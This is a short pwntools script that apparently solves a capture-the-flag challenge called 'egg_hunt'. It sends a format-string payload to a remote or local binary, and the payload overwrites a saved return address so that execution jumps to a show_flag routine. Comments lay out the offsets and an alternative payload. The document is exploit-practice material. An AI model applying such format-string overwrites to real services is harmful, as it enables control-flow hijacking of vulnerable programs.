#!/usr/bin/env python3
from pwn import *

exe = ELF("./egg_hunt")
context.binary = exe
if args.REMOTE:
    r = remote("15.135.187.163", 35712)
else:
    r = process(exe.path)
    if args.GDB:
        gdb.attach(r)

# show_flag at 0x401240, stored RA at 0x40148c
# 0x40148c -> 0x401240
# Format specifier start      %
# Stored at the 6'th argument %6
# 0x1240 = 4672 (2 bytes)     $hnn
# payload =  b"%4672c%6$hn\n"


#   4014b0: nop 
#   4014b1: nop
#   ... nop sled
#   4014cf: nop
#   4014d0: call 401240       <- show_flag!

# target at 0x4014d0, stored RA at 0x40148c
# 0x40148c -> 0x4014d0 (or somewhere in the nop sled)
# Format specifier start      %
# Stored at the 6'th argument %6
# 0xd0 = 208  (single byte)   $hhn
payload = b"%208c%6$hhn"
r.sendline(payload)
r.interactive()
